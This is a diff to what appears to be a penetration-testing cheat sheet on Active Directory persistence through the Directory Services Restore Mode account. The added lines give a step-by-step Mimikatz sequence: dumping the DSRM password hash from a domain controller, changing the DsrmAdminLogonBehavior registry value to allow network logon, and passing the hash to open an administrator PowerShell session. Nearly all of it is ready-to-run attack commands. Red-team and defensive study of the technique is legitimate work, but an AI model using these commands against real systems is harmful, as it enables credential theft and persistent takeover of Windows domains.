@@ -26,17 +26,21 @@ mimikatz # !
 ```
 ### DSRM (Directory Services Restore Mode)
 - There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd
-
-1. Dump DSRM password (DA privileges required)
 ```powershell
+1. Dump DSRM password (DA privileges required)
 C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <hostname>
-```
 
 2. Compare the Administrator hash with the Admin hash of this command
-```powershell
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <hostname>
+
+3. First one is the DSRM local Admin. Pass the hash can be used to authenticate
+4. Logon behavior for DSRM account needs to be changed
+C:> Enter-PSSession -Computername <hostname> 
+C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
+5. PAss the hash
+C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
 ```
-3. First one is the DSRM local Admin
 
 ### MORE
 
